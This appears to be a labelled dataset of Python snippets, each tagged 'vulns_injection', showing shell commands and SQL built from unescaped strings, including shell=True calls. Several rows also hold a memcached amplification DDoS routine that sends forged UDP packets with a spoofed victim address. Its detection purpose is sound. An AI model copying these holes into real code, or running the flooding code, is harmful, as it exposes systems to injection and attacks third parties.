            ssh_cmd = 'svcinfo lslicense -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsnode -delim !',vulns_injection
"        ssh_cmd = ('svctask chhost -chapsecret ""%(chap_secret)s"" %(host_name)s'                   % {'chap_secret': chap_secret, 'host_name': host_name})",vulns_injection
        ssh_cmd = 'svcinfo lsiscsiauth -delim !',vulns_injection
            ssh_cmd = 'svcinfo lsfabric -wwpn %s -delim !' % wwpn,vulns_injection
            ssh_cmd = 'svcinfo lshost -delim ! %s' % host,vulns_injection
        ssh_cmd = 'svcinfo lshost -delim !',vulns_injection
"        ssh_cmd = ('svctask mkhost -force %(port1)s -name ""%(host_name)s""' %                   {'port1': port1, 'host_name': host_name})            ssh_cmd = ('svctask addhostport -force %s %s' % (port, host_name))",vulns_injection
        ssh_cmd = 'svcinfo lshostvdiskmap -delim ! %s' % host_name,vulns_injection
"            ssh_cmd = ('svctask mkvdiskhostmap -host %(host_name)s -scsi '                       '%(result_lun)s %(volume_name)s' %                       {'host_name': host_name,                        'result_lun': result_lun,                        'volume_name': volume_name})",vulns_injection
"                ssh_cmd = ssh_cmd.replace('mkvdiskhostmap',                                          'mkvdiskhostmap -force')",vulns_injection
        ssh_cmd = 'svctask rmhost %s ' % host_name,vulns_injection
        cmd = 'svcinfo lsfabric -host %s' % host_name,vulns_injection
"            ssh_cmd = 'svctask rmvdiskhostmap -host %s %s' % \                (host_name, vol_name)",vulns_injection
        ssh_cmd = 'svcinfo lsvdisk -bytes -delim ! %s ' % vdisk_name        ssh_cmd = 'svcinfo lsvdiskfcmappings -nohdr %s' % vdisk_name,vulns_injection
"        autoex = '-autoexpand' if opts['autoexpand'] else ''        easytier = '-easytier on' if opts['easytier'] else '-easytier off'            ssh_cmd_se_opt = ''            ssh_cmd_se_opt = (                '-rsize %(rsize)d%% %(autoex)s -warning %(warn)d%%' %                {'rsize': opts['rsize'],                 'autoex': autoex,                 'warn': opts['warning']})                ssh_cmd_se_opt = ssh_cmd_se_opt + ' -compressed'                ssh_cmd_se_opt = ssh_cmd_se_opt + (                    ' -grainsize %d' % opts['grainsize'])        ssh_cmd = ('svctask mkvdisk -name %(name)s -mdiskgrp %(mdiskgrp)s '                   '-iogrp 0 -size %(size)s -unit '                   '%(unit)s %(easytier)s %(ssh_cmd_se_opt)s'                   % {'name': name,                   'mdiskgrp': self.configuration.storwize_svc_volpool_name,                   'size': size, 'unit': units, 'easytier': easytier,                   'ssh_cmd_se_opt': ssh_cmd_se_opt})",vulns_injection
"        copyflag = '' if full_copy else '-copyrate 0'        fc_map_cli_cmd = ('svctask mkfcmap -source %(src)s -target %(tgt)s '                          '-autodelete %(copyflag)s' %                          {'src': source,                           'tgt': target,                           'copyflag': copyflag})",vulns_injection
"            out, err = self._run_ssh('svctask prestartfcmap %s' % fc_map_id)",vulns_injection
"            out, err = self._run_ssh('svctask startfcmap %s' % fc_map_id)",vulns_injection
        fc_ls_map_cmd = 'svcinfo lsfcmap -filtervalue id=%s -delim !' % \            fc_map_id,vulns_injection
                        ssh_cmd = ('svctask chfcmap -copyrate 50 '                                   '-autodelete on %s' % map_id),vulns_injection
                            self._run_ssh('svctask stopfcmap %s' % map_id)                            self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask stopfcmap %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id),vulns_injection
"        forceflag = '-force' if force else ''        cmd_params = {'frc': forceflag, 'name': name}        ssh_cmd = 'svctask rmvdisk %(frc)s %(name)s' % cmd_params",vulns_injection
"        ssh_cmd = ('svctask expandvdisksize -size %(amt)d -unit gb %(name)s'                   % {'amt': extend_amt, 'name': volume['name']})",vulns_injection
        ssh_cmd = 'svcinfo lssystem -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -bytes -delim ! %s' % pool,vulns_injection
        ssh_cmd = '%s -delim !' % cmd,vulns_injection
                    ' command %s') % ssh_cmd),vulns_injection
"                  % {'cmd': ssh_cmd,",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -add fakehost '                           '123456789012345 123456789054321')        show_host_cmd = 'showhost -verbose fakehost',vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -add fakehost '                           'iqn.1993-08.org.debian:01:222'),vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -host fakehost',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname'        show_vlun_cmd = 'showvlun -a -host fakehost'        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
"        self._cli_run(""setwsapi -sru high"", None)",vulns_injection
"            self._cli_run(""growvv -f %s %sg"" % (volume_name, growth_size),                          None)",vulns_injection
"    def _cli_run(self, verb, cli_args):        cli_arg_strings = []        if cli_args:            for k, v in cli_args.items():                if k == '':                    cli_arg_strings.append("" %s"" % k)                else:                    cli_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cli_arg_strings)",vulns_injection
"    def _run_ssh(self, command, check_exit=True, attempts=1):",vulns_injection
"        self._cli_run('removehost %s' % hostname, None)        out = self._cli_run('createvlun %s auto %s' % (volume, hostname), None)",vulns_injection
"        out = self._cli_run('showhost -verbose %s' % (hostname), None)",vulns_injection
"        out = self._cli_run('showport', None)",vulns_injection
"        out = self._cli_run('showport -iscsi', None)",vulns_injection
"        result = self._cli_run('showport -iscsiname', None)",vulns_injection
"        self._cli_run('setqos %svvset:%s' %                      (cli_qos_string, vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)            self._cli_run('createvvset -domain %s %s' % (domain,                                                         vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)        self._cli_run('setqos -clear vvset:%s' % (vvs_name), None)        self._cli_run('removevvset -f %s' % (vvs_name), None)        self._cli_run('removevvset -f %s %s' % (vvs_name, volume_name), None)",vulns_injection
"        cmd = 'createvvcopy -p %s -online ' % src_name            cmd += '-snp_cpg %s ' % snap_cpg            cmd += '-tpvv '            cmd += cpg + ' '        cmd += dest_name        self._cli_run(cmd, None)",vulns_injection
"        cmd = ""removevv -f %s"" % volume_name        out = self._cli_run(cmd, None)",vulns_injection
"        out = self._cli_run('showhost -d', None)",vulns_injection
"    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'                                   % (persona_id, domain,                                      hostname, "" "".join(wwn)), None)    def _modify_3par_fibrechan_host(self, hostname, wwn):        out = self.common._cli_run('createhost -add %s %s'                                   % (hostname, "" "".join(wwn)), None)",vulns_injection
"        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \              (persona_id, domain, hostname, iscsi_iqn)        out = self.common._cli_run(cmd, None)        self.common._cli_run('createhost -iscsi -add %s %s'                             % (hostname, iscsi_iqn), None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -showcols Port', None)",vulns_injection
"        cliq_arg_strings = []            cliq_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cliq_arg_strings)        return self._run_ssh(cmd, check_exit_code)",vulns_injection
"                                 'authmethod chap',",vulns_injection
"                cmd.extend(['authmethod chap', 'username',",vulns_injection
"                c.execute(""SELECT EXISTS(SELECT 1 FROM USER WHERE id=""+str(author.id)+"" collate nocase) LIMIT 1"")            c.execute(""INSERT INTO USER VALUES ('""+author.name+""',""+author.id+"",'""+str(author.bot)+""','""+author.avatar+""','""+str(author.created_at)+""')"")        c.execute(""SELECT EXISTS(SELECT 1 FROM SERVERS WHERE id=""+str(server.id)+"" collate nocase) LIMIT 1"")            c.execute(""INSERT INTO SERVERS VALUES ('""+server.name+""',""+server.id+"",""+server.owner.id+"")"")        print(message.edited_timestamp)        sql_command = message.id+"",'""+str(message.edited_timestamp)+""','""+str(message.timestamp)+""','""+str(message.tts)+""','""+str(message.author.name)+""',""+str(message.author.id)+"",'""+message.content+""',""+message.server.id+"",""+message.channel.id                print(sql_command)                c.execute(""INSERT INTO MESSAGE VALUES (""+sql_command+"")"")",vulns_injection
    bot.add_cog(Database(bot)),vulns_injection
"            cur.execute(""INSERT INTO tags(name) VALUE('%s')"" %name)",vulns_injection
"        cur.execute('DELETE FROM tasks'                "" WHERE tagid=(SELECT tagid FROM tags WHERE name='%s')"" %name)                if cur.execute(""DELETE FROM tags WHERE name='%s'"" %name) \",vulns_injection
"        if cur.execute(""SELECT tagid FROM tags WHERE name='%s'"" %tag):            cur.execute(""INSERT INTO tasks(%s) VALUES('%s')""                    %(','.join(cols.keys()), ""','"".join(cols.values())))",vulns_injection
"                if cur.execute(""UPDATE tasks SET due_date=%s WHERE taskid=%s""                        %(date, int(taskid))) \",vulns_injection
                        ' WHERE taskid=%d' %int(taskid)) \,vulns_injection
                if cur.execute('DELETE FROM tasks WHERE taskid=%d' \                %int(taskid)) else Database.DOES_NOT_EXIST,vulns_injection
"    Runs a command in shell and provides stdout, stderr and stdin streams.    This function creates a context manager that sets up the process, returns    to caller, closes streams and waits for process to exit on leaving.    The process is opened in `universal_newlines` mode.    :param command: The command to run on shell.                    that is used to spawn the process (except `shell`,                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    `TypeError` is raised then).                    shell=True,",vulns_injection
"    Runs a command in shell and returns the read stdout and stderr data.    This function waits for the process to exit.    :param command: The command to run on shell.                    that is used to spawn the process (except `shell`,                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    `TypeError` is raised then).",vulns_injection
"    out_hostname, _ = run_shell_command([""echo"", ""$host.name""])    out_0, _ = run_shell_command([""echo"", ""$0""])",vulns_injection
"            self.uut.executable = ""more""",vulns_injection
"        return "" "".join(            escape_path_argument(s) for s in (                sys.executable,                             scriptname)))",vulns_injection
"            with run_interactive_shell_command(""some_command"", shell=False):",vulns_injection
                                                         stdin=stdin_input),vulns_injection
"    Runs a command in shell and provides stdout, stderr and stdin streams.    This function creates a context manager that sets up the process, returns    to caller, closes streams and waits for process to exit on leaving.    The process is opened in ``universal_newlines`` mode.    :param command: The command to run on shell.    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    that is used to spawn the process (except ``shell``,                    ``stdout``, ``stderr``, ``stdin`` and                    shell=True,",vulns_injection
"    Runs a command in shell and returns the read stdout and stderr data.    This function waits for the process to exit.    :param command: The command to run on shell.    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    that is used to spawn the process (except ``shell``,                    ``stdout``, ``stderr``, ``stdin`` and",vulns_injection
"    out = run_shell_command(""echo $host.name"")[0]    out = run_shell_command(""echo $0"")[0]",vulns_injection
"        return "" "".join(            escape_path_argument(s) for s in (                sys.executable,                             scriptname)))",vulns_injection
"            with run_interactive_shell_command(""some_command"", shell=False):",vulns_injection
"    Runs a command in shell and provides stdout, stderr and stdin streams.    This function creates a context manager that sets up the process, returns    to caller, closes streams and waits for process to exit on leaving.    The process is opened in `universal_newlines` mode.    :param command: The command to run on shell.                    that is used to spawn the process (except `shell`,                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    `TypeError` is raised then).                    shell=True,",vulns_injection
"    Runs a command in shell and returns the read stdout and stderr data.    This function waits for the process to exit.    :param command: The command to run on shell.                    that is used to spawn the process (except `shell`,                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    `TypeError` is raised then).",vulns_injection
"    out_hostname, _ = run_shell_command([""echo"", ""$host.name""])    out_0, _ = run_shell_command([""echo"", ""$0""])",vulns_injection
"            self.uut.executable = ""more""",vulns_injection
"        return "" "".join(            escape_path_argument(s) for s in (                sys.executable,                             scriptname)))",vulns_injection
"            with run_interactive_shell_command(""some_command"", shell=False):",vulns_injection
                                                         stdin=stdin_input),vulns_injection
"    Runs a command in shell and provides stdout, stderr and stdin streams.    This function creates a context manager that sets up the process, returns    to caller, closes streams and waits for process to exit on leaving.    The process is opened in ``universal_newlines`` mode.    :param command: The command to run on shell.    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    that is used to spawn the process (except ``shell``,                    ``stdout``, ``stderr``, ``stdin`` and                    shell=True,",vulns_injection
"    Runs a command in shell and returns the read stdout and stderr data.    This function waits for the process to exit.    :param command: The command to run on shell.    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    that is used to spawn the process (except ``shell``,                    ``stdout``, ``stderr``, ``stdin`` and",vulns_injection
"    out = run_shell_command(""echo $host.name"")[0]    out = run_shell_command(""echo $0"")[0]",vulns_injection
"        return "" "".join(            escape_path_argument(s) for s in (                sys.executable,                             scriptname)))",vulns_injection
"            with run_interactive_shell_command(""some_command"", shell=False):",vulns_injection
"    Runs a command in shell and provides stdout, stderr and stdin streams.    This function creates a context manager that sets up the process, returns    to caller, closes streams and waits for process to exit on leaving.    The process is opened in `universal_newlines` mode.    :param command: The command to run on shell.                    that is used to spawn the process (except `shell`,                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    `TypeError` is raised then).                    shell=True,",vulns_injection
"    Runs a command in shell and returns the read stdout and stderr data.    This function waits for the process to exit.    :param command: The command to run on shell.                    that is used to spawn the process (except `shell`,                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    `TypeError` is raised then).",vulns_injection
"    out_hostname, _ = run_shell_command([""echo"", ""$host.name""])    out_0, _ = run_shell_command([""echo"", ""$0""])",vulns_injection
"            self.uut.executable = ""more""",vulns_injection
"        return "" "".join(            escape_path_argument(s) for s in (                sys.executable,                             scriptname)))",vulns_injection
"            with run_interactive_shell_command(""some_command"", shell=False):",vulns_injection
                                                         stdin=stdin_input),vulns_injection
"    Runs a command in shell and provides stdout, stderr and stdin streams.    This function creates a context manager that sets up the process, returns    to caller, closes streams and waits for process to exit on leaving.    The process is opened in ``universal_newlines`` mode.    :param command: The command to run on shell.    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    that is used to spawn the process (except ``shell``,                    ``stdout``, ``stderr``, ``stdin`` and                    shell=True,",vulns_injection
"    Runs a command in shell and returns the read stdout and stderr data.    This function waits for the process to exit.    :param command: The command to run on shell.    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    that is used to spawn the process (except ``shell``,                    ``stdout``, ``stderr``, ``stdin`` and",vulns_injection
"    out = run_shell_command(""echo $host.name"")[0]    out = run_shell_command(""echo $0"")[0]",vulns_injection
"        return "" "".join(            escape_path_argument(s) for s in (                sys.executable,                             scriptname)))",vulns_injection
"            with run_interactive_shell_command(""some_command"", shell=False):",vulns_injection
"    if subprocess.call(""javac -cp tmp/ tmp/%s"" % backdoor, shell=True) != 0:",vulns_injection
"            p = subprocess.Popen(""ping -c1 {}"".format(self.remoteIP), shell=True)",vulns_injection
"            p = subprocess.Popen(""ping -c1 {}"".format(self.remoteIP), shell=True)",vulns_injection
"            p = subprocess.Popen(""ping -c1 {}"".format(self.remoteIP), shell=True)",vulns_injection
"            p = subprocess.Popen(""ping -c1 {}"".format(self.remoteIP), shell=True)",vulns_injection
"import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparserfrom selenium import webdriverfrom PIL import Image",vulns_injection
"			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > NUL 2>&1"")			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > /dev/null 2>&1"")",vulns_injection
"		web = webdriver.Chrome()		print "" [+]Opening Google Chrome...""		return web",vulns_injection
"def clear():	if os.name == ""nt"":		os.system(""cls"")	else:		os.system(""clear"")",vulns_injection
"			if port == """":port = 1337",vulns_injection
"import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparserfrom selenium import webdriverfrom PIL import Image",vulns_injection
"			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > NUL 2>&1"")			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > /dev/null 2>&1"")",vulns_injection
"		web = webdriver.Chrome()		print "" [+]Opening Google Chrome...""		return web",vulns_injection
"def clear():	if os.name == ""nt"":		os.system(""cls"")	else:		os.system(""clear"")",vulns_injection
"			if port == """":port = 1337",vulns_injection
"import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparserfrom selenium import webdriverfrom PIL import Image",vulns_injection
"			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > NUL 2>&1"")			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > /dev/null 2>&1"")",vulns_injection
"		web = webdriver.Chrome()		print "" [+]Opening Google Chrome...""		return web",vulns_injection
"def clear():	if os.name == ""nt"":		os.system(""cls"")	else:		os.system(""clear"")",vulns_injection
"			if port == """":port = 1337",vulns_injection
"import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparserfrom selenium import webdriverfrom PIL import Image",vulns_injection
"			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > NUL 2>&1"")			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > /dev/null 2>&1"")",vulns_injection
"		web = webdriver.Chrome()		print "" [+]Opening Google Chrome...""		return web",vulns_injection
"def clear():	if os.name == ""nt"":		os.system(""cls"")	else:		os.system(""clear"")",vulns_injection
"			if port == """":port = 1337",vulns_injection
"  os.system('shasum -c %s.sha256' % base)  os.system('shasum -c %s.asc.sha256' % base)  os.system('gpg --verify %s.asc %s' % (base, base))  os.system('keybase verify %s.asc' % base)  os.system('tar xf ' + filename)  install_opts = '--prefix=${PWD}/%s --disable-ldconfig' % target  os.system('%s/install.sh %s' % (basename, install_opts))  os.system('rm -rf %s' % basename)",vulns_injection
"  os.system('rm -rf %s' % install_dir)  os.system('tar cjf %s.tar.bz2 %s/*' % (tar_basename, install_dir))  os.system('rm -rf %s' % install_dir)",vulns_injection
    Temporarily fix: Only works for SIDs with a length of < 10.    if '/' in sid or '\\' in sid:        return False    if len(sid) >= 10:        return False    return True,vulns_injection
"            request.files['testcsv'].save(os.path.join(path, app.config['TESTING_FN']))                request.files['trainingcsv'].save(os.path.join(path, app.config['TRAINING_FN']))                    copyfile(os.path.join(app.config['TRAINING_FOLDER'], fn),                             os.path.join(path, app.config['TRAINING_FN']))            link = '<a href=""%s"" class=""alert-link"">page</a>' % url_for('view', sid=session_id)            success_txt = 'Success! To view progress later, bookmark the %s' % link            flash(Markup(success_txt))            f = open(os.path.join(path, 'logs.txt'), 'w')",vulns_injection
"    return redirect(url_for('experiment',                            title=""Try it Out!"",                            sitekey=app.config['G_CAPTCHA_SITEKEY'],                            form=form,                            files=utils.SAMPLE_FILES))    if '/' not in sid:        path = os.path.join(app.config['UPLOAD_FOLDER'], sid)            return render_template('view.html',            sid=sid, title=""Progress for %s"" % sid, using_firebase=using_firebase)",vulns_injection
    if not app.config['FIREBASE']:        abort(400)    if request.json is None:,vulns_injection
"    if '/' not in sid:        path = os.path.join(app.config['UPLOAD_FOLDER'], sid)        if os.path.isfile(os.path.join(path, app.config['LOG_FILE'])):        abort(403)    if not utils.sid_is_valid(sid):        abort(400)    path = os.path.join(app.config['UPLOAD_FOLDER'], sid)    if os.path.isfile(os.path.join(path, app.config['RESULTS_ZIP'])):        return send_from_directory(directory=path,                                    filename=app.config['RESULTS_ZIP'])        abort(404)    if not utils.sid_is_valid(sid):        abort(400)    path = os.path.join(app.config['UPLOAD_FOLDER'], sid)    if os.path.isdir(path):        if not app.config['TESTING']:            rmtree(path)    else:        abort(404)    if app.config['FIREBASE']:        fbdb.child('sessions').child(sid).remove()    flash('Success! Deleted run data for ""%s""' % sid)    return '', 200",vulns_injection
"            self.adb.pull('%s %s' % (br_out_path, full_out_path))            self.adb.bugreport(' > %s' % full_out_path)",vulns_injection
import randomimport socketimport time,vulns_injection
class AdbProxy():,vulns_injection
"        if serial:            self.adb_str = 'adb -s %s' % serial        else:            self.adb_str = 'adb'    def _exec_cmd(self, cmd):        """"""Executes adb commands in a new shell.        This is specific to executing adb binary because stderr is not a good        indicator of cmd execution status.            cmds: A string that is the adb command to execute.",vulns_injection
"            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)        logging.debug('cmd: %s, stdout: %s, stderr: %s, ret: %s', cmd, out,            raise AdbError(cmd=cmd, stdout=out, stderr=err, ret_code=ret)    def _exec_adb_cmd(self, name, arg_str):        return self._exec_cmd(' '.join((self.adb_str, name, arg_str)))",vulns_injection
"        self.forward('tcp:%d tcp:%d' % (host_port, device_port))",vulns_injection
"        def adb_call(*args):            arg_str = ' '.join(str(elem) for elem in args)            return self._exec_adb_cmd(clean_name, arg_str)",vulns_injection
            adb_shell_cmd: A string that is an adb shell cmd with grep.            return self._adb.shell(adb_shell_cmd).decode('utf-8'),vulns_injection
"    def bugreport(self, params):        expected = os.path.join(logging.log_path,                                ""AndroidDevice%s"" % self.serial, ""BugReports"",                                ""test_something,sometime,%s"" % (self.serial))        assert expected in params, ""Expected '%s', got '%s'."" % (expected,                                                                 params)",vulns_injection
                                        Version: 3.2,vulns_injection
"            data = input(""[] Enter payload contained inside packet: "") or ""\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n""",vulns_injection
"                        if power>1:                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))                            with suppress_stdout():                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                        elif power==1:                            print('[+] Sending 1 forged UDP packet to: %s' % i)                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                        if power>1:                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))                            with suppress_stdout():                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)                        elif power==1:                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)",vulns_injection
                                        Version: 3.2,vulns_injection
"            data = input(""[] Enter payload contained inside packet: "") or ""\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n""",vulns_injection
"                        if power>1:                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))                            with suppress_stdout():                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                        elif power==1:                            print('[+] Sending 1 forged UDP packet to: %s' % i)                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                        if power>1:                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))                            with suppress_stdout():                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)                        elif power==1:                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)",vulns_injection
                                        Version: 3.2,vulns_injection
"            data = input(""[] Enter payload contained inside packet: "") or ""\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n""",vulns_injection
"                        if power>1:                            print('[+] Sending %d forged UDP packets to: %s' % (power, i))                            with suppress_stdout():                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                        elif power==1:                            print('[+] Sending 1 forged UDP packet to: %s' % i)                                send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)                        if power>1:                            print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))                            with suppress_stdout():                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)                        elif power==1:                            print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)",vulns_injection
"                LOG.debug(""Command execution successful."")                return result",vulns_injection
                                      vm=ip_address),vulns_injection
"            30, (9, 60),",vulns_injection
"        self._script_path = conf.pop('script_path', None)        if self._script_path:            self._script_path = os.path.abspath(self._script_path)        else:            code_path = os.path.abspath(os.path.dirname(__file__))            self._script_path = os.path.join(code_path, 'scripts')        self._logger.info(""Script search path is: %s"", self._script_path)            keys = ', '.join(conf.keys())            raise ValueError(""Unused worker config params: '%s'"" % keys)",vulns_injection
"            command = ""%s %s"" % (COMMANDMAP[job['type']][job['protocol']], random.choice(src))",vulns_injection
"                command += "" %s"" % random.choice(dst)                                                         env=dict(os.environ,                                                                  PATH=self._script_path,                                                                  X509_USER_PROXY=proxyfile.name))",vulns_injection
"                          choices=('a9', 'p2020'), dest='architecture',",vulns_injection
"                    choices=('all', 'results', 'campaign'),                    help='delete {results} for the selected campaign, '                         'delete selected {campaign} and its results, '                         'or delete {all} campaigns and results')",vulns_injection
                        db.log_event_exception(                            'SSH error')                    self.serial.port+' '+str(self.result_data['id'])+': ',vulns_injection
                            db.log_event_exception(                                'SCP error')                        self.serial.port+' '+str(self.result_data['id'])+': ',vulns_injection
                        db.log_event_exception(                            'SSH error')                    self.serial.port+' '+str(self.result_data['id'])+': ',vulns_injection
                except:                            db.log_event_exception(                                'SCP error')                        self.serial.port+' '+str(self.result_data['id'])+': ',vulns_injection
"                        event_buff = buff.replace(event_buff_logged, '')                        db.log_event(self.result_data['id'],                                     ('DUT' if not self.aux else 'AUX'),                                     'Read timeout', event_buff)                        event_buff_logged += event_buff",vulns_injection
        out = ''        try:            out += self.debugger.dut.serial.port+' '        except AttributeError:            pass        out += (str(self.result_data['id'])+': ' +                self.result_data['outcome_category']+' - ' +                self.result_data['outcome']),vulns_injection
                            db.log_event_exception(                                'Error resetting DUT')                            self.debugger.dut.serial.port+' ' +,vulns_injection
"        fields = ('source', 'event_type', 'description')",vulns_injection
"                  'data_diff', 'detected_errors', 'num_injections', 'targets',                  'registers')",vulns_injection
"                            'outcome': 'Incomplete',",vulns_injection
"                  campaign=False, success=None):",vulns_injection
"    def __exit__(self, type_, value, traceback):        self.connection.commit()        self.connection.close()        self.lock.release()        if type_ is not None or value is not None or traceback is not None:            return False  # reraise exception",vulns_injection
"                         'Connected to serial port', serial_port)                         'Closed serial port')            pass",vulns_injection
"                with self.db as db:                    db.log_event('Information',                                 'DUT' if not self.aux else 'AUX',                                 'Flushed serial buffer')",vulns_injection
                dut_scp = SCPClient(ssh.get_transport()),vulns_injection
"                                     'Sent files', ', '.join(files))",vulns_injection
                dut_scp = SCPClient(ssh.get_transport()),vulns_injection
"                                     'Received file', file_)",vulns_injection
                             'Booted'),vulns_injection
"        with self.db as db:            db.log_event('Information', 'DUT' if not self.aux else 'AUX',                         'Logged in",vulns_injection
    def close(self):        self.debugger.dut.flush()        if self.db.campaign['aux']:            self.debugger.aux.flush()        if self.db.result:,vulns_injection
                    db.log_result(True),vulns_injection
            self.debugger.dut.serial.timeout = 30,vulns_injection
                self.debugger.dut.serial.timeout = 30,vulns_injection
"                         self.options.debugger_ip_address+':'+str(self.port))                db.log_event('Information', 'Debugger', 'Closed telnet')",vulns_injection
"                        db.log_event('Information', 'Debugger', 'Reset DUT')            db.log_event('Information', 'Debugger', 'Halt DUT')            db.log_event('Information', 'Debugger', 'Continue DUT')",vulns_injection
"            db.log_event('Information', 'Debugger', 'Timed application',                         campaign=True)",vulns_injection
            injection['bit'] = randrange(num_bits_to_inject),vulns_injection
"                    db.insert('injection', injection)                    db.log_event('Information', 'Debugger', 'Fault injected')                injection['success'] = False                            db.insert('injection', injection)                            db.log_event('Warning', 'Debugger',                                         'Fault injected as supervisor')                        db.insert('injection', injection)                        db.log_event('Warning', 'Debugger', 'Injection failed')",vulns_injection
"                db.log_event('Information', 'Debugger', 'Launched openocd')",vulns_injection
"                db.log_event('Information', 'Debugger', 'Closed openocd')",vulns_injection
"        label='AUX output',",vulns_injection
"        label='Debugger output',",vulns_injection
"        label='DUT output',",vulns_injection
"        label='Outcome',        label='Outcome category',                   'detected_errors', 'dut_serial_port', 'timestamp')",vulns_injection
"from django_tables2 import Column, DateTimeColumn, Table, TemplateColumn",vulns_injection
    num_cycles = Column(),vulns_injection
    cycles_between = Column()    num_checkpoints = Column(),vulns_injection
"    select = TemplateColumn(        '<input type=""checkbox"" name=""select_box"" value=""{{ record.id }}"">',        verbose_name='', orderable=False)",vulns_injection
